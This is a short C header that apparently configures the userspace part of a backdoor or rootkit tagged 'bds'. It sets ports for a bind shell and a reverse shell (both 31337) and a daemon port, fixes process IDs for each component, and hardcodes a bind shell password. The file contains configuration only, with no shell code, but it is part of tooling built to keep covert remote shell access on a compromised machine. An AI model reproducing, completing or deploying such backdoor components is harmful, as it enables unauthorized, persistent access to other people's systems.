#ifndef _bds_userspace_config_H_
#define _bds_userspace_config_H_

int bind_port = 31337;
int reverse_shell_port = 31337;
int daemon_port = 31335;

int bind_pid = 31337;
int reverse_pid = 31338;
int daemon_pid = 31335;

/* maximal password length is 16 */
static const char *bindshell_password = "bluedragonsec";
#endif
